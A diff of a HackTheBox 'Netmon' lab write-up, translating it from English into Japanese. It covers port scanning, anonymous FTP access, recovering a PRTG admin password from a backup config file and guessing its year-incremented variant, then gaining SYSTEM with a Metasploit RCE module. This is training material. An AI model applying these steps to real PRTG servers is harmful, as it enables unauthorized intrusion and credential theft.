@@ -1,11 +1,9 @@
 
 # Netmon - HackTheBox
 
-I'm going through NetSec's Trophy Room for fun and this box showed me how important it is to think outside of the box. Or in this case, like a lazy admin!
+# Enumeration・情報収集
 
-# Enumeration
-
-I started off by running Rustscan on the target, then adding the IP into my /etc/hosts file.
+最初はRustScanを使って、/etc/hostsにIPアドレスを追加しました。
 
 ```bash
 Open 10.10.10.152:21
@@ -23,7 +21,7 @@ Open 10.10.10.152:49668
 Open 10.10.10.152:49669
 ```
 
-Next, an Nmap Scan.
+次はNmapスキャン。
 
 ```bash
 21/tcp    open  ftp          Microsoft ftpd
@@ -69,9 +67,9 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-# User Flag
+# User Flag・初期侵入
 
-FTP had anonymous access allowed. So logging in as an anonymous user and browsing to the Public user rewards you with the user flag.
+FTPのanonymousログインが許可されて、ログインして、Publicユーザーのホームフォルダーでuserフラグは取った。
 
 ```bash
  manwithaplan@manwithabox  /media/sf_manwithaplan/HTB/netmon  ftp netmon.htb
@@ -130,40 +128,42 @@ ftp> exit
 
 # Root Flag
 
-## Getting admin creds
+## Getting admin creds・アドミンログインを獲得
 
-There is a website running on port 80.
+ポート８０ではウェブサイトがあります。
 
 ![PRTG Network Monitor](https://i.gyazo.com/0dc803cbd9f2852ecd223bc55083cc60.png)
 
-Default creds (prtgadmin:prtgadmin) didnt work but [this](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) reddit post led me to this directory:
+PRTGのデフォルトユーザーネームとパスワードは無理だったけど![このレディットポースト](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) を読んで、このディレクトリーはみつかりました：
 
 ```bash
 /ProgramData/Paessler/PRTG Network Monitor
 ```
 
-In that folder, credentials can be found in PRTG Confguration.old.bak
+そのフォルダーで"PRTG Confguration.old.bak"っていうファイルの中にはアドミンパスワードが発見しました。
 
 ```xml
 <!-- User: prtgadmin -->
     PrTg@dmin2018
 ```
 
-However these creds didnt work.
+しかし、パスワードを取っても無理でした。
 
-Embarrasingly I needed to use the official guide, and instead of PrTg@dmin2018, PrTg@dmin**2019** was the correct password.
+恥ずかしいですが、公式解説を読むことにしました。。。
+公式解説によりますと、パスワードはPrTg@dmin2018じゃなくて、PrTg@dmin**2019**は正解でした。
 
-Always check for those kinds of patterns as lazy admins passwords change with months/years.
+アドミンは怠けて、パスワードでの年や月だけを変えるのが確かですね。（本当に会社で見たことがありました！）
+そういうパターンを忘れないようにしましょう。
 
-## Popping a revshell
+## Popping a revshell・リバースシェル
 
-Conviniently, there is a metasploit module for RCE
+PRTGバージョンにはRCE(リモート・コード・エクセキューション)のmetasploit moduleがあります。
 
 ```bash
 exploit/windows/http/prtg_authenticated_rce
 ```
 
-The account running PRTG was already authenticated as SYSTEM so the flag was trivial.
+PRTGを起動したユーザーはもうrootなので、userとrootフラグの獲得は簡単でした。
 
 ```powershell
 meterpreter > cd Administrator
